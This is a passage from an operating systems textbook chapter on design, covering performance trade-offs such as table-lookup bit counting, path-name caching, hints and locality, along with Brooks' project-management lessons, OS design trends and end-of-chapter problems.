By this we mean that once the performance has achieved a reasonable level, it is probably not worth the effort and complexity to squeeze out the last few percent. If the scheduling algorithm is reasonably fair and keeps the CPU busy 90% of the time, it is doing its job. Devising a far more complex one that is 5% better is probably a bad idea. Similarly, if the page rate is low enough that it is not a bottleneck, jumping through hoops to get optimal performance is usually not worth it. Avoiding disaster is far more important than getting optimal performance, especially since what is optimal with one load may not be optimal with another.

Another concern is what to optimize when. Some programmers have a tendency to optimize to death whatever they develop, as soon as it is appears to work. The problem is that after optimization, the system may be less clean, making it harder to maintain and debug. Also, it makes it harder to adapt it, and perhaps do more fruitful optimization later. The problem is known as premature optimization. Donald Knuth, sometimes referred to as the father of the analysis of algorithms, once said that “premature optimization is the root of all evil.”

### 12.4.3 Space-Time Trade-offs

One general approach to improving performance is to trade off time vs. space. It frequently occurs in computer science that there is a choice between an algorithm that uses little memory but is slow and an algorithm that uses much more memory but is faster. When making an important optimization, it is worth looking for algorithms that gain speed by using more memory or conversely save precious memory by doing more computation.

One technique that is sometimes helpful is to replace small procedures by macros. Using a macro eliminates the overhead that is associated with a procedure call. The gain is especially significant if the call occurs inside a loop. As an example, suppose we use bitmaps to keep track of resources and frequently need to know how many units are free in some portion of the bitmap. For this purpose we will need a procedure, bit_count, that counts the number of 1 bits in a byte. The
obvious procedure is given in Fig. 12-7(a). It loops over the bits in a byte, counting them one at a time. It is pretty simple and straightforward.

```
#define BYTE_SIZE 8 /* A byte contains 8 bits */
int bit_count(int byte)
{ /* Count the bits in a byte. */
    int i, count = 0;
    for (i = 0; i < BYTE_SIZE; i++) /* loop over the bits in a byte */
        if ((byte >> i) & 1) count++; /* if this bit is a 1, add to count */
    return(count); /* return sum */
}
            (a)
/*Macro to add up the bits in a byte and return the sum. */
#define bit_count(b) ((b&1) + ((b>>1)&1) + ((b>>2)&1) + ((b>>3)&1) + \
        ((b>>4)&1) + ((b>>5)&1) + ((b>>6)&1) + ((b>>7)&1))
            (b)
/*Macro to look up the bit count in a table. */
char bits[256] = {0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4, 1, 2, 2, 3, 2, 3, 3, ...};
#define bit_count(b) (int) bits[b]
        (c)
```

Figure 12-7. (a) A procedure for counting bits in a byte. (b) A macro to count the bits. (c) A macro that counts bits by table lookup.

This procedure has two sources of inefficiency. First, it must be called, stack space must be allocated for it, and it must return. Every procedure call has this overhead. Second, it contains a loop, and there is always some overhead associated with a loop.

A completely different approach is to use the macro of Fig. 12-7(b). It is an inline expression that computes the sum of the bits by successively shifting the argument, masking out everything but the low-order bit, and adding up the eight terms. The macro is hardly a work of art, but it appears in the code only once. When the macro is called, for example, by

```
sum = bit_count(table[i]);
```

the macro call looks identical to the call of the procedure. Thus, other than one somewhat messy definition, the code does not look any worse in the macro case than in the procedure case, but it is much more efficient since it eliminates both the procedure-call overhead and the loop overhead.

We can take this example one step further. Why compute the bit count at all? Why not look it up in a table? After all, there are only 256 different bytes, each with a unique value between 0 and 8 . We can declare a 256-entry table, bits, with each entry initialized (at compile time) to the bit count corresponding to that byte
value. With this approach no computation at all is needed at run time, just one indexing operation. A macro to do the job is given in Fig. 12-7(c).

This is a clear example of trading computation time against memory. However, we could go still further. If the bit counts for whole 32-bit words are needed, using our bit_count macro, we need to perform four lookups per word. If we expand the table to 65,536 entries, we can suffice with two lookups per word, at the price of a much bigger table.

Looking answers up in tables can also be used in other ways. Anwell-known image-compression technique, GIF, uses table lookup to encode 24-bit RGB pixels. However, GIF only works on images with 256 or fewer colors. For each image to be compressed, a palette of 256 entries is constructed, each entry containing one 24-bit RGB value. The compressed image then consists of an 8-bit index for each pixel instead of a 24-bit color value, a gain of a factor of three. This idea is illustrated for a 4 × 4 section of an image in Fig. 12-8. The original compressed image is shown in Fig. 12-8(a). Each value is a 24-bit value, with 8 bits for the intensity of red, green, and blue, respectively. The GIF image is shown in Fig. 12-8(b). Each value is an 8-bit index into the color palette. The color palette is stored as part of the image file, and is shown in Fig. 12-8(c). Actually, there is more to GIF, but the core idea is table lookup.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-475_574_1213_1098_160.jpg)

Figure 12-8. (a) Part of an uncompressed image with 24 bits per pixel. (b) The same part compressed with GIF, with 8 bits per pixel. (c) The color palette.

There is another way to reduce image size, and it illustrates a different tradeoff. PostScript is a programming language that can be used to describe images. (Actually, any programming language can describe images, but PostScript is tuned for this purpose.) Many printers have a PostScript interpreter built into them to be able to run PostScript programs sent to them.

For example, if there is a rectangular block of pixels all the same color in an image, a PostScript program for the image would carry instructions to place a rectangle at a certain location and fill it with a certain color. Only a handful of bits are needed to issue this command. When the image is received at the printer, an interpreter there must run the program to construct the image. Thus PostScript achieves data compression at the expense of more computation, a different trade-off than table lookup, but a valuable one when memory or bandwidth is scarce.

Other trade-offs often involve data structures. Doubly linked lists take up more memory than singly linked lists, but often allow faster access to items. Hash tables are even more wasteful of space, but faster still. In short, one of the main things to consider when optimizing a piece of code is whether using different data structures would make the best time-space trade-off.

### 12.4.4 Caching

A well-known technique for improving performance is caching. It is applicable whenever it is likely the same result will be needed multiple times. The general approach is to do the full work the first time, and then save the result in a cache. On subsequent attempts, the cache is first checked. If the result is there, it is used. Otherwise, the full work is done again.

We have already seen the use of caching within the file system to hold some number of recently used disk blocks, thus saving a disk read on each hit. However, caching can be used for many other purposes as well. For example, parsing path names is surprisingly expensive. Consider the UNIX example of Fig. 4-34 again. To look up /usr/ast/mbox requires the following disk accesses:

1. Read the i-node for the root directory (i-node 1).
2. Read the root directory (block 1).
3. Read the i-node for /usr (i-node 6).
4. Read the /usr directory (block 132).
5. Read the i-node for /usr/ast (i-node 26).
6. Read the /usr/ast directory (block 406).

It takes six disk accesses just to discover the i-node number of the file. Then the inode itself has to be read to discover the disk block numbers. If the file is smaller than the block size (e.g., 1024 bytes), it takes eight disk accesses to read the data.

Some systems optimize path-name parsing by caching (path, i-node) combinations. For the example of Fig. 4-34, the cache will certainly hold the first three entries of Fig. 12-9 after parsing /usr/ast/mbox. The last three entries come from parsing other paths.

When a path has to be looked up, the name parser first consults the cache and searches it for the longest substring present in the cache. For example, if the path

| Path | I-node number |
| --- | --- |
| /usr | 6 |
| /usr/ast | 26 |
| /usr/ast/mbox | 60 |
| /usr/ast/books | 92 |
| /usr/bal | 45 |
| /usr/bal/paper.ps | 85 |

Figure 12-9. Part of the i-node cache for Fig. 4-34.

/usr/ast/grants/erc is presented, the cache returns the fact that /usr/ast is i-node 26, so the search can start there, eliminating four disk accesses.

A problem with caching paths is that the mapping between file name and inode number is not fixed for all time. Suppose that the file /usr/ast/mbox is removed from the system and its i-node reused for a different file owned by a different user. Later, the file /usr/ast/mbox is created again, and this time it gets i-node 106. If nothing is done to prevent it, the cache entry will now be wrong and subsequent lookups will return the wrong i-node number. For this reason, when a file or directory is deleted, its cache entry and (if it is a directory) all the entries below it must be purged from the cache.

Disk blocks and path names are not the only items that are cacheable. I-nodes can be cached, too. If pop-up threads are used to handle interrupts, each one of them requires a stack and some additional machinery. These previously used threads can also be cached, since refurbishing a used one is easier than creating a new one from scratch (to avoid having to allocate memory). Just about anything that is hard to produce can be cached.

### 12.4.5 Hints

Cache entries are always correct. A cache search may fail, but if it finds an entry, that entry is guaranteed to be correct and can be used without further ado. In some systems, it is convenient to have a table of hints. These are suggestions about the solution, but they are not guaranteed to be correct. The called must verify the result itself.

A well-known example of hints are the URLs embedded on Web pages. Clicking on a link does not guarantee that the Web page pointed to is there. In fact, the page pointed to may have been removed 10 years ago. Thus the information on the pointing page is really only a hint.

Hints are also used in connection with remote files. The information in the hint tells something about the remote file, such as where it is located. However, the file may have moved or been deleted since the hint was recorded, so a check is always needed to see if it is correct.

### 12.4.6 Exploiting Locality

Processes and programs do not act at random. They exhibit a fair amount of locality in time and space, and this information can be exploited in various ways to improve performance. One well-known example of spatial locality is the fact that processes do not jump around at random within their address spaces. They tend to use a relatively small number of pages during a given time interval. The pages that a process is actively using can be noted as its working set, and the operating system can make sure that when the process is allowed to run, its working set is in memory, thus reducing the number of page faults.

The locality principle also holds for files. When a process has selected a particular working directory, it is likely that many of its future file references will be to files in that directory. By putting all the i-nodes and files for each directory close together on the disk, performance improvements can be obtained. This principle is what underlies the Berkeley Fast File System (McKusick et al., 1984).

Another area in which locality plays a role is in thread scheduling in multiprocessors. As we saw in Chap. 8, one way to schedule threads on a multiprocessor is to try to run each thread on the CPU it last used, in hopes that some of its memory blocks will still be in the memory cache.

### 12.4.7 Optimize the Common Case

It is frequently a good idea to distinguish between the most common case and the worst possible case and treat them differently. Often the code for the two is quite different. It is important to make the common case fast. For the worst case, if it occurs rarely, it is sufficient to make it correct.

As a first example, consider entering a critical region. Most of the time, the entry will succeed, especially if processes do not spend a lot of time inside critical regions. Windows 8 takes advantage of this expectation by providing a WinAPI call EnterCriticalSection that atomically tests a flag in user mode (using TSL or equivalent). If the test succeeds, the process just enters the critical region and no kernel call is needed. If the test fails, the library procedure does a down on a semaphore to block the process. Thus, in the normal case, no kernel call is needed. In Chap. 2 we saw that futexes on Linux likewise optimize for the common case of no contention.

As a second example, consider setting an alarm (using signals in UNIX). If no alarm is currently pending, it is straightforward to make an entry and put it on the timer queue. However, if an alarm is already pending, it has to be found and removed from the timer queue. Since the alarm call does not specify whether there is already an alarm set, the system has to assume worst case, that there is. However, since most of the time there is no alarm pending, and since removing an existing alarm is expensive, it is a good idea to distinguish these two cases.

One way to do this is to keep a bit in the process table that tells whether an alarm is pending. If the bit is off, the easy path is followed (just add a new timerqueue entry without checking). If the bit is on, the timer queue must be checked.

### 12.5 PROJECT MANAGEMENT

Programmers are perpetual optimists. Most of them think that the way to write a program is to run to the keyboard and start typing. Shortly thereafter the fully debugged program is finished. For very large programs, it does not quite work like that. In the following sections we have a bit to say about managing large software projects, especially large operating system projects.

### 12.5.1 The Mythical Man Month

In his classic book, The Mythical Man Month, Fred Brooks, one of the designers of OS/360, who later moved to academia, addresses the question of why it is so hard to build big operating systems (Brooks, 1975, 1995). When most programmers see his claim that programmers can produce only 1000 lines of debugged code per year on large projects, they wonder whether Prof. Brooks is living in outer space, perhaps on Planet Bug. After all, most of them can remember an all nighter when they produced a 1000-line program in one night. How could this be the annual output of anybody with an $\mathrm{IQ}>50$ ?

What Brooks pointed out is that large projects, with hundreds of programmers, are completely different than small projects and that the results obtained from small projects do not scale to large ones. In a large project, a huge amount of time is consumed planning how to divide the work into modules, carefully specifying the modules and their interfaces, and trying to imagine how the modules will interact, even before coding begins. Then the modules have to be coded and debugged in isolation. Finally, the modules have to be integrated and the system as a whole has to be tested. The normal case is that each module works perfectly when tested by itself, but the system crashes instantly when all the pieces are put together. Brooks estimated the work as being

1/3 Planning
1/6 Coding
1/4 Module testing
1/4 System testing
In other words, writing the code is the easy part. The hard part is figuring out what the modules should be and making module $A$ correctly talk to module $B$. In a small program written by a single programmer, all that is left over is the easy part.

The title of Brooks’ book comes from his assertion that people and time are not interchangeable. There is no such unit as a man-month (or a person-month). If
a project takes 15 people 2 years to build, it is inconceivable that 360 people could do it in 1 month and probably not possible to have 60 people do it in 6 months.

There are three reasons for this effect. First, the work cannot be fully parallelized. Until the planning is done and it has been determined what modules are needed and what their interfaces will be, no coding can even be started. On a twoyear project, the planning alone may take 8 months.

Second, to fully utilize a large number of programmers, the work must be partitioned into large numbers of modules so that everyone has something to do. Since every module might potentially interact with every other one, the number of module-module interactions that need to be considered grows as the square of the number of modules, that is, as the square of the number of programmers. This complexity quickly gets out of hand. Careful measurements of 63 software projects have confirmed that the trade-off between people and months is far from linear on large projects (Boehm, 1981).

Third, debugging is highly sequential. Setting 10 debuggers on a problem does not find the bug 10 times as fast. In fact, ten debuggers are probably slower than one because they will waste so much time talking to each other.

Brooks sums up his experience with trading-off people and time in Brooks’ Law:

Adding manpower to a late software project makes it later.
The problem with adding people is that they have to be trained in the project, the modules have to be redivided to match the larger number of programmers now available, many meetings will be needed to coordinate all the efforts, and so on. Abdel-Hamid and Madnick (1991) confirmed this law experimentally. A slightly irreverent way of restating Brooks law is

It takes 9 months to bear a child, no matter how many women you assign to the job.

### 12.5.2 Team Structure

Commercial operating systems are large software projects and invariably require large teams of people. The quality of the people matters immensely. It has been known for decades that top programmers are 10× more productive than bad programmers (Sackman et al., 1968). The trouble is, when you need 200 programmers, it is hard to find 200 top programmers; you have to settle for a wide spectrum of qualities.

What is also important in any large design project, software or otherwise, is the need for architectural coherence. There should be one mind controlling the design. Brooks cites the Reims cathedral in France as an example of a large project that took decades to build, and in which the architects who came later subordinated
their desire to put their stamp on the project to carry out the initial architect’s plans. The result is an architectural coherence unmatched in other European cathedrals.

In the 1970s, Harlan Mills combined the observation that some programmers are much better than others with the need for architectural coherence to propose the chief programmer team paradigm (Baker, 1972). His idea was to organize a programming team like a surgical team rather than like a hog-butchering team. Instead of everyone hacking away like mad, one person wields the scalpel. Everyone else is there to provide support. For a 10-person project, Mills suggested the team structure of Fig. 12-10.

| Title | Duties |
| --- | --- |
| Chief programmer | Performs the architectural design and writes the code |
| Copilot | Helps the chief programmer and serves as a sounding board |
| Administrator | Manages the people, budget, space, equipment, reporting, etc. |
| Editor | Edits the documentation, which must be written by the chief programmer |
| Secretaries | The administrator and editor each need a secretary |
| Program clerk | Maintains the code and documentation archives |
| Toolsmith | Provides any tools the chief programmer needs |
| Tester | Tests the chief programmer’s code |
| Language lawyer | Part timer who can advise the chief programmer on the language |

Figure 12-10. Mills’ proposal for populating a 10-person chief programmer team.

Three decades have gone by since this was proposed and put into production. Some things have changed (such as the need for a language lawyer-C is simpler than PL/I), but the need to have only one mind controlling the design is still true. And that one mind should be able to work $100 \%$ on designing and programming, hence the need for the support staff, although with help from the computer, a smaller staff will suffice now. But in its essence, the idea is still valid.

Any large project needs to be organized as a hierarchy. At the bottom level are many small teams, each headed by a chief programmer. At the next level, groups of teams must be coordinated by a manager. Experience shows that each person you manage costs you 10% of your time, so a full-time manager is needed for each group of 10 teams. These managers must be managed, and so on.

Brooks observed that bad news does not travel up the tree well. Jerry Saltzer of M.I.T. called this effect the bad-news diode. No chief programmer or his manager wants to tell the big boss that the project is 4 months late and has no chance whatsoever of meeting the deadline because there is a 2000-year-old tradition of beheading the messenger who brings bad news. As a consequence, top management is generally in the dark about the state of the project. When it becomes undeniably obvious that the deadline cannot be met under any conditions, top management panics and responds by adding people, at which time Brooks’ Law kicks in.

In practice, large companies, which have had long experience producing software and know what happens if it is produced haphazardly, have a tendency to at least try to do it right. In contrast, smaller, newer companies, which are in a huge rush to get to market, do not always take the care to produce their software carefully. This haste often leads to far from optimal results.

Neither Brooks nor Mills foresaw the growth of the open source movement. While many expressed doubt (especially those leading large closed-source software companies), open source software has been a tremendous success. From large servers to embedded devices, and from industrial control systems to handheld smartphones, open source software is everywhere. Large companies like Google and IBM are throwing their weight behind Linux now and contribute heavily in code. What is noticeable is that the open source software projects that have been most successful have clearly used the chief-programmer model of having one mind control the architectural design (e.g., Linus Torvalds for the Linux kernel and Richard Stallman for the GNU C compiler).

### 12.5.3 The Role of Experience

Having experienced designers is absolutely critical to any software project. Brooks points out that most of the errors are not in the code, but in the design. The programmers correctly did what they were told to do. What they were told to do was wrong. No amount of test software will catch bad specifications.

Brooks’ solution is to abandon the classical development model illustrated in Fig. 12-11(a) and use the model of Fig. 12-11(b). Here the idea is to first write a main program that merely calls the top-level procedures, initially dummies. Starting on day 1 of the project, the system will compile and run, although it does nothing. As time goes on, real modules replace the dummies. The result is that system integration testing is performed continuously, so errors in the design show up much earlier, so the learning process caused by bad design starts earlier.

A little knowledge is a dangerous thing. Brooks observed what he called the second system effect. Often the first product produced by a design team is minimal because the designers are afraid it may not work at all. As a result, they are hesitant to put in many features. If the project succeeds, they build a follow-up system. Impressed by their own success, the second time the designers include all the bells and whistles that were intentionally left out the first time. As a result, the second system is bloated and performs poorly. The third time around they are sobered by the failure of the second system and are cautious again.

The CTSS-MULTICS pair is a clear case in point. CTSS was the first generalpurpose timesharing system and was a huge success despite having minimal functionality. Its successor, MULTICS, was too ambitious and suffered badly for it. The ideas were good, but there were too many new things, so the system performed poorly for years and was never a commercial success. The third system in this line of development, UNIX, was much more cautious and much more successful.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-483_580_1235_235_150.jpg)

Figure 12-11. (a) Traditional software design progresses in stages. (b) Alternative design produces a working system (that does nothing) starting on day 1.

### 12.5.4 No Silver Bullet

In addition to The Mythical Man Month, Brooks also wrote an influential paper called “No Silver Bullet” (Brooks, 1987). In it, he argued that none of the many nostrums being hawked by various people at the time was going to generate an order-of-magnitude improvement in software productivity within a decade. Experience shows that he was right.

Among the silver bullets that were proposed were better high-level languages, object-oriented programming, artificial intelligence, expert systems, automatic programming, graphical programming, program verification, and programming environments. Perhaps the next decade will see a silver bullet, but maybe we will have to settle for gradual, incremental improvements.

### 12.6 TRENDS IN OPERATING SYSTEM DESIGN

In 1899, the head of the U.S. Patent Office, Charles H. Duell, asked then-President McKinley to abolish the Patent Office (and his job!), because, as he put it: “Everything that can be invented, has been invented” (Cerf and Navasky, 1984). Nevertheless, Thomas Edison showed up on his doorstep within a few years with a couple of new items, including the electric light, the phonograph, and the movie projector. The point is that the world is constantly changing and operating systems must adapt to the new reality all the time. In this section, we mention a few trends that are relevant for operating system designers today.

To avoid confusion, the hardware developments mentioned below are here already. What is not here is the operating system software to use them effectively.

Generally, when new hardware arrives, what everyone does is just plop the old software (Linux, Windows, etc.) down on it and call it a day. In the long run, this is a bad idea. What we need is innovative software to deal with innovative hardware. If you are a computer science or engineering student or an ICT professional, your homework assignment is to think up this software.

### 12.6.1 Virtualization and the Cloud

Virtualization is an idea whose time has definitely come-again. It first surfaced in 1967 with the IBM CP/CMS system, but now it is back in full force on the x86 platform. Many computers are now running hypervisors on the bare hardware, as illustrated in Fig. 12-12. The hypervisor creates a number of virtual machines, each with its own operating system. This phenomenon was discussed in Chap. 7 and appears to be the wave of the future. Nowadays, many companies are taking the idea further by virtualizing other resources also. For instance, there is much interest in virtualizing the control of network equipment, even going so far as running the control of their networks in the cloud also. In addition, vendors and researchers constantly work on making hypervisors better for some notion of better: smaller, faster, or with provable isolation properties.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-484_274_762_1071_385.jpg)

Figure 12-12. A hypervisor running four virtual machines.

### 12.6.2 Manycore Chips

There used to be a time that memory was so scarce that a programmer knew every byte in person and celebrated its birthday. Nowaways, programmers rarely worry about wasting a few megabytes here and there. For most applications, memory is no longer a scarce resource. What will happen when cores become equally plentiful? Phrased differently, as manufacturers are putting more and more cores on a die, what happens if there are so many that a programmers stops worrying about wasting a few cores here and there?

Manycore chips are here already, but the operating systems for them do not use them well. In fact, stock operating systems often do not even scale beyond a few dozens of cores and developers are constantly struggling to remove all the bottlenecks that limit scalability.

One obvious question is: what do you do with all the cores? If you run a popular server handling many thousands of client requests per second, the answer may be relatively simple. For instance, you may decide to dedicate a core to each request. Assuming you do not run into locking issues too much, this may work. But what do we do with all those cores on tablets?

Another question is: what sort of cores do we want? Deeply pipelined, superscalar cores with fancy out-of-order and speculative execution at high clock rates may be great for sequential code, but not for your energy bill. They also do not help much if your job exhibits a lot of parallelism. Many applications are better off with smaller and simpler cores, if they get more of them. Some experts argue for heterogeneous multicores, but the questions remain the same: what cores, how many, and at what speeds? And we have not even begun to mention the issue of running an operating system and all of its applications. Will the operating system run on all cores or only some? Will there be one or more network stacks? How much sharing is needed? Do we dedicate certain cores to specific operating system functions (like the network or storage stack)? If so, do we replicate such functions for better scalability?

Exploring many different directions, the operating system world is currently trying to formulate answers to these questions. While researchers may disagree on the answers, most of them agree on one thing: these are exciting times for systems research!

### 12.6.3 Large-Address-Space Operating Systems

As machines move from 32-bit address spaces to 64-bit address spaces, major shifts in operating system design become possible. A 32-bit address space is not really that big. If you tried to divide up $2^{32}$ bytes by giving everybody on earth his or her own byte, there would not be enough bytes to go around. In contrast, $2^{64}$ is about $2 \times 10^{19}$. Now everybody gets a personal 3-GB chunk.

What could we do with an address space of $2 \times 10^{19}$ bytes? For starters, we could eliminate the file-system concept. Instead, all files could be conceptually held in (virtual) memory all the time. After all, there is enough room in there for over 1 billion full-length movies, each compressed to 4 GB.

Another possible use is a persistent object store. Objects could be created in the address space and kept there until all references to them were gone, at which time they would be automatically deleted. Such objects would be persistent in the address space, even over shutdowns and reboots of the computer. With a 64-bit address space, objects could be created at a rate of 100 MB/sec for 5000 years before we ran out of address space. Of course, to actually store this amount of data, a lot of disk storage would be needed for the paging traffic, but for the first time in history, the limiting factor would be disk storage, not address space.

With large numbers of objects in the address space, it becomes interesting to allow multiple processes to run in the same address space at the same time, to
share the objects in a general way. Such a design would clearly lead to very different operating systems than we now have.

Another operating system issue that will have to be rethought with 64-bit addresses is virtual memory. With $2^{64}$ bytes of virtual address space and 8-KB pages we have $2^{51}$ pages. Conventional page tables do not scale well to this size, so something else is needed. Inverted page tables are a possibility, but other ideas have been proposed as well (Talluri et al., 1995). In any event there is plenty of room for new research on 64-bit operating systems.

### 12.6.4 Seamless Data Access

Ever since the dawn of computing, there has been a strong distinction between this machine and that machine. If the data was on this machine, you could not access it from that machine, unless you explicitly transferred it first. Similarly, even if you had the data, you could not use it unless you had the right software installed. This model is changing.

Nowadays, users expect much of the data to be accessible from anywhere at any time. Typically, this is accomplished by storing the data in the cloud using storage services like Dropbox, GoogleDrive, iCloud, and SkyDrive. All files stored there can be accessed from any device that has a network connection. Moreover, the programs to access the data often reside in the cloud too, so you do not even have to have all the programs installed either. It allows people to read and modify word-processor files, spreadsheets, and presentations using a smartphone on the toilet. This is generally regarded as progress.

To make this happen seamlessly is tricky and requires a lot of clever systems’ solutions under the hood. For instance, what to do if there is no network connection? Clearly, you do not want to stop people from working. Of course, you could buffer changes locally and update the master document when the connection was re-established, but what if multiple devices have made conflicting changes? This is a very common problem if multiple users share data, but it could even happen with a single user. Moreover, if the file is large, you do not want to wait a long time until you can access it. Caching, preloading and synchronization are key issues here. Current operating systems deal with merging multiple machines in a seamful way (assuming that “seamful” is the opposite of “seamless”) We can surely do a lot better.

### 12.6.5 Battery-Powered Computers

Powerful PCs with 64-bit address spaces, high-bandwidth networking, multiple processors, and high-quality audio and video, are now standard on desktop systems and moving rapidly into notebooks, tablets, and even smartphones. As this trend
continues, their operating systems will have to be appreciably different from current ones to handle all these demands. In addition, they must balance the power budget and “keep cool.” Heat dissipation and power consumption are some of the most important challenges even in high-end computers.

However, an even faster growing segment of the market is battery-powered computers, including notebooks, tablets, $100 laptops, and smartphones. Most of these have wireless connections to the outside world. They demand operating systems that are smaller, faster, more flexible, and more reliable than operating systems on high-end devices. Many of these devices today are based on traditional operating systems like Linux, Windows and OS X, but with significant modification. In addition, they frequently use a microkernel/hypervisor-based solution to manage the radio stack.

These operating systems have to handle fully connected (i.e., wired), weakly connected (i.e., wireless), and disconnected operation, including data hoarding before going offline and consistency resolution when going back online, better than current systems. In the future, they will also have to handle the problems of mobility better than current systems (e.g., find a laser printer, log onto it, and send it a file by radio). Power management, including extensive dialogs between the operating system and applications about how much battery power is left and how it can be best used, will be essential. Dynamic adaptation of applications to handle the limitations of tiny screens may become important. Finally, new input and output modes, including handwriting and speech, may require new techniques in the operating system to improve the quality. It is likely that the operating system for a battery-powered, handheld wireless, voice-operated computer will be appreciably different from that of a desktop 64-bit 16-core CPU with a gigabit fiber-optic network connection. And, of course, there will be innumerable hybrid machines with their own requirements.

### 12.6.6 Embedded Systems

One final area in which new operating systems will proliferate is embedded systems. The operating systems inside washing machines, microwave ovens, dolls, radios, MP3 players, camcorders, elevators, and pacemakers will differ from all of the above and most likely from each other. Each one will probably be carefully tailored for its specific application, since it is unlikely anyone will ever stick a PCIe card into a pacemaker to turn it into an elevator controller. Since all embedded systems run only a limited number of programs, known at design time, it may be possible to make optimizations not possible in general-purpose systems.

A promising idea for embedded systems is the extensible operating system (e.g., Paramecium and Exokernel). These can be made as lightweight or heavyweight as the application in question demands, but in a consistent way across applications. Since embedded systems will be produced by the hundreds of millions, this will be a major market for new operating systems.

### 12.7 SUMMARY

Designing an operating system starts with determining what it should do. The interface should be simple, complete, and efficient. It should have a clear user-interface paradigm, execution paradigm, and data paradigm.

The system should be well structured, using one of several known techniques, such as layering or client-server. The internal components should be orthogonal to one another and clearly separate policy from mechanism. Considerable thought should be given to issues such as static vs. dynamic data structure, naming, binding time, and order of implementing modules.

Performance is important, but optimizations should be chosen carefully so as not to ruin the system’s structure. Space-time trade-offs, caching, hints, exploiting locality, and optimizing the common case are often worth doing.

Writing a system with a couple of people is different than producing a big system with 300 people. In the latter case, team structure and project management play a crucial role in the success or failure of the project.

Finally, operating systems are changing to adapt to new trends and meet new challenges. These include hypervisor-based systems, multicore systems, 64-bit address spaces, handheld wireless computers, and embedded systems. There is no doubt that the coming years will be exciting times for operating system designers.

## PROBLEMS

1. Moore’s Law describes a phenomenon of exponential growth similar to the population growth of an animal species introduced into a new environment with abundant food and no natural enemies. In nature, an exponential growth curve is likely eventually to become a sigmoid curve with an asymptotic limit when food supplies become limiting or predators learn to take advantage of new prey. Discuss some factors that may eventually limit the rate of improvement of computer hardware.
2. In Fig. 12-1, two paradigms are shown, algorithmic and event driven. For each of the following kinds of programs, which of the following paradigms is likely to be easiest to use?
3. A compiler.
4. A photo-editing program.
5. A payroll program.
6. Hierarchical file names always start at the top of the tree. Consider, for example, the file name /usr/ast/books/mos2/chap-12 rather than chap-12/mos2/books/ast/usr. In contrast, DNS names start at the bottom of the tree and work up. Is there some fundamental reason for this difference?
7. Corbató’s dictum is that the system should provide minimal mechanism. Here is a list of POSIX calls that were also present in UNIX Version 7. Which ones are redundant, that is, could be removed with no loss of functionality because simple combinations of other ones could do the same job with about the same performance? Access, alarm, chdir, chmod, chown, chroot, close, creat, dup, exec, exit, fcntl, fork, fstat, ioctl, kill, link, Iseek, mkdir, mknod, open, pause, pipe, read, stat, time, times, umask, unlink, utime, wait, and write.
8. Suppose that layers 3 and 4 in Fig. 12-2 were exchanged. What implications would that have for the design of the system?
9. In a microkernel-based client-server system, the microkernel just does message passing and nothing else. Is it possible for user processes to nevertheless create and use semaphores? If so, how? If not, why not?
10. Careful optimization can improve system-call performance. Consider the case in which one system call is made every 10 msec. The average time of a call is 2 msec. If the system calls can be speeded up by a factor of two, how long does a process that took 10 sec to run now take?
11. Operating systems often do naming at two different levels: external and internal. What are the differences between these names with respect to
    1. Length?
    2. Uniqueness?
    3. Hierarchies?
12. One way to handle tables whose size is not known in advance is to make them fixed, but when one fills up, to replace it with a bigger one, copy the old entries over to the new one, then release the old one. What are the advantages and disadvantages of making the new one 2× the size of the original one, as compared to making it only 1.5× as big?
13. In Fig. 12-5, a flag, found, is used to tell whether the PID was located. Would it b possible to forget about found and just test $p$ at the end of the loop to see whether it got to the end or not?
14. In Fig. 12-6, the differences between the x86 and the UltraSPARC are hidden by conditional compilation. Could the same approach be used to hide the difference between x86 machines with an IDE disk as the only disk and x86 machines with a SCSI disk as the only disk? Would it be a good idea?
15. Indirection is a way of making an algorithm more flexible. Does it have any disadvantages, and if so, what are they?
16. Can reentrant procedures have private static global variables? Discuss your answer.
17. The macro of Fig. 12-7(b) is clearly much more efficient than the procedure of Fig. 12-7(a). One disadvantage, however, is that it is hard to read. Are there any other disadvantages? If so, what are they?
18. Suppose that we need a way of computing whether the number of bits in a 32-bit word is odd or even. Devise an algorithm for performing this computation as fast as possible.

You may use up to 256 KB of RAM for tables if need be. Write a macro to carry out your algorithm. Extra Credit: Write a procedure to do the computation by looping over the 32 bits. Measure how many times faster your macro is than the procedure.

1. In Fig. 12-8, we saw how GIF files use 8-bit values to index into a color palette. The same idea can be used with a 16-bit-wide color palette. Under what circumstances, if any, might a 24-bit color palette be a good idea?
2. One disadvantage of GIF is that the image must include the color palette, which increases the file size. What is the minimum image size for which an 8-bit-wide color palette breaks even? Now repeat this question for a 16-bit-wide color palette.
3. In the text we showed how caching path names can result in a significant speedup when looking up path names. Another technique that is sometimes used is having a daemon program that opens all the files in the root directory and keeps them open permanently, in order to force their i-nodes to be in memory all the time. Does pinning the i-nodes like this improve the path lookup even more?
4. Even if a remote file has not been removed since a hint was recorded, it may have been changed since the last time it was referenced. What other information might it be useful to record?
5. Consider a system that hoards references to remote files as hints, for example as (name, remote-host, remote-name). It is possible that a remote file will quietly be removed and then replaced. The hint may then retrieve the wrong file. How can this problem be made less likely to occur?
6. In the text it is stated that locality can often be exploited to improve performance. But consider a case where a program reads input from one source and continuously outputs to two or more files. Can an attempt to take advantage of locality in the file system lead to a decrease in efficiency here? Is there a way around this?
7. Fred Brooks claims that a programmer can write 1000 lines of debugged code per year, yet the first version of MINIX (13,000 lines of code) was produced by one person in under three years. How do you explain this discrepancy?
8. Using Brooks’ figure of 1000 lines of code per programmer per year, make an estimate of the amount of money it took to produce Windows 8. Assume that a programmer costs $100,000 per year (including overhead, such as computers, office space, secretarial support, and management overhead). Do you believe this answer? If not, what might be wrong with it?
9. As memory gets cheaper and cheaper, one could imagine a computer with a big battery-backed-up RAM instead of a hard disk. At current prices, how much would a low-end RAM-only PC cost? Assume that a 100 -GB RAM-disk is sufficient for a lowend machine. Is this machine likely to be competitive?
10. Name some features of a conventional operating system that are not needed in an embedded system used inside an appliance.
11. Write a procedure in C to do a double-precision addition on two given parameters. Write the procedure using conditional compilation in such a way that it works on 16-bit machines and also on 32-bit machines.
